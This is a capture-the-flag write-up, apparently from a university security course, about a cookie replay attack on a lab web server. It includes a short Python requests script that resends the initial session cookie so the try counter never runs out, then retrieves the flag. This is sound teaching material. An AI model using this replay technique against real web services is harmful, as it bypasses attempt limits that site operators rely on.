# Challenge `Python requests Again` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Vulnerable to replay attack

- Where: Where is the vulnerability present
  - `http://mustard.stt.rnl.tecnico.ulisboa.pt:23054`

- Impact: What results of exploiting this vulnerability
  - Allows the user to resend cookies to get the correct result

## Steps to reproduce

1. Start a `requests` session in `http://mustard.stt.rnl.tecnico.ulisboa.pt:23054/hello`
2. Get the initial cookie, with the remaining number of tries
3. Extract the objective and current total from the page text
4. Repeatedly access `http://mustard.stt.rnl.tecnico.ulisboa.pt:23054/more`, resending the initial cookie in order to not run out of tries, until the total equals the objective
5. Access `http://mustard.stt.rnl.tecnico.ulisboa.pt:23054/finish` to get the flag

The code used was the following:

```py
  import requests
  import re

  res = requests.get("http://mustard.stt.rnl.tecnico.ulisboa.pt:23054/hello")
  cookies = res.cookies

  res = requests.get("http://mustard.stt.rnl.tecnico.ulisboa.pt:23054/more", cookies=cookies)
  nums = re.findall(r'\d+', res.text)

  while nums[2] != nums[1]:
      res = requests.get("http://mustard.stt.rnl.tecnico.ulisboa.pt:23054/more", cookies=cookies)
      nums = re.findall(r'\d+', res.text)

  finish = requests.get("http://mustard.stt.rnl.tecnico.ulisboa.pt:23054/finish", cookies=cookies)
  print(finish.text)
```
